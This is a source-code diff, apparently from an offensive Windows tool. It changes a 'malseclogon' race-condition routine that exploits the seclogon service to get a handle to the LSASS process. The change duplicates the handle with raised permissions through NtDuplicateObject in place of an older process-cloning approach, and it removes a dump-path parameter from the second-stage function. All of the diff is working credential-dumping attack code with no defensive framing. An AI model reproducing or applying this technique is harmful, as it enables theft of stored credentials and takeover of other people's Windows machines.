@@ -834,6 +834,7 @@ DWORD get_seclogon_pid(VOID)
 
 HANDLE malseclogon_race_condition(
     IN DWORD lsass_pid,
+    IN DWORD permissions,
     IN DWORD attributes)
 {
     BOOL success = FALSE;
@@ -844,7 +845,7 @@ HANDLE malseclogon_race_condition(
     HANDLE hProcess = NULL;
     HANDLE hEvent = NULL;
     HANDLE hFile = NULL;
-    DWORD permissions = 0 ;
+    DWORD seclogon_permissions = 0 ;
     NTSTATUS status = STATUS_UNSUCCESSFUL;
 
     seclogon_pid = get_seclogon_pid();
@@ -866,16 +867,16 @@ HANDLE malseclogon_race_condition(
      * these are the permissions used by seclogon
      * to open a handle to the calling process
      */
-    permissions  = 0;
-    permissions |= PROCESS_QUERY_INFORMATION;
-    permissions |= PROCESS_QUERY_LIMITED_INFORMATION;
-    permissions |= PROCESS_CREATE_PROCESS;
-    permissions |= PROCESS_DUP_HANDLE;
+    seclogon_permissions  = 0;
+    seclogon_permissions |= PROCESS_QUERY_INFORMATION;
+    seclogon_permissions |= PROCESS_QUERY_LIMITED_INFORMATION;
+    seclogon_permissions |= PROCESS_CREATE_PROCESS;
+    seclogon_permissions |= PROCESS_DUP_HANDLE;
 
     // look for a handle owned by seclogon with the specified permissions
     handle_list = find_process_handles_in_process(
         seclogon_pid,
-        permissions);
+        seclogon_permissions);
     if (!handle_list || !handle_list->Count)
     {
         PRINT_ERR("No process handles found in seclogon. The race condition didn't work.");
@@ -925,19 +926,28 @@ HANDLE malseclogon_race_condition(
         DPRINT("Found " LSASS " handle");
 
         /*
-         * create a 'clone' of the LSASS process,
-         * taking advantage the fact that the handle
-         * we duplicated has PROCESS_CREATE_PROCESS
+         * we need to elevate our lsass handle
+         * so that we get the permissions we need
          */
+        status = NtDuplicateObject(
+            hDupedHandle,
+            NtCurrentProcess(),
+            NtCurrentProcess(),
+            &hProcess,
+            permissions,
+            attributes,
+            0);
+        if (!NT_SUCCESS(status))
+        {
+            syscall_failed("NtDuplicateObject", status);
+            goto end;
+        }
+        /*
+        // duplicating the handle is a better approach
         hProcess = fork_process(
             hDupedHandle,
             attributes);
-        if (hProcess)
-        {
-            // the handle is closed by fork_process
-            hDupedHandle = NULL;
-            break;
-        }
+        */
     }
 
 end:
@@ -957,8 +967,7 @@ end:
 
 #ifdef EXE
 
-HANDLE malseclogon_stage_2(
-    IN LPCSTR dump_path)
+HANDLE malseclogon_stage_2(VOID)
 {
     BOOL found_handle = FALSE;
     HANDLE hProcess = NULL;
